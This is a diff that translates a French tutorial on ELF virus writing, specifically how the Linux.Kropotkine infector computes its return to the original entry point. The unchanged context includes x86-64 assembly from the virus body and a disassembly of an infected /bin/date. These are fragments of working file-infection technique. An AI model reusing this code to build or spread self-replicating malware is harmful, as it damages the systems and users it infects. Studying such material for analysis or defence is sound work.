@@ -34,7 +34,7 @@ Je vais décrire ici la méthode que j'ai utilisée pour calculer Ret2OEP dans L
 
 Voici donc le code :
 
--------------------------------- CUT-HERE ------------------------------------------
+-------------------------------- COUPEZ ICI ----------------------------------------
 mov rcx, r15 ;r15 holds the addr where the code of our vx is stored (in the stack)
 add rcx, VXSIZE ; rcx now contains the first addr after the code of the vx
 mov dword [rcx], 0xffffeee8 ; relative call to get_eip (which is 13 bytes before)
@@ -52,7 +52,7 @@ Comme vous pouvez le voir, nous écrivons le code de retour à l'OEP octet par o
 
 (ce code provient de mon /bin/date que j'ai infecté avec Lin64.Kropotkine)
 
--------------------------------- CUT-HERE ------------------------------------------
+-------------------------------- COUPEZ ICI ----------------------------------------
 ; end of the vx code:
 get_rip:
 0x0c01ada3      488b0424       mov rax, qword [rsp]
@@ -114,5 +114,5 @@ Hasta siempre!
 
 --- Source ---
 
-- Linux.Kropotkine.asm (See file in txt/)
+- Linux.Kropotkine.asm (Voir le fichier dans txt/)
 
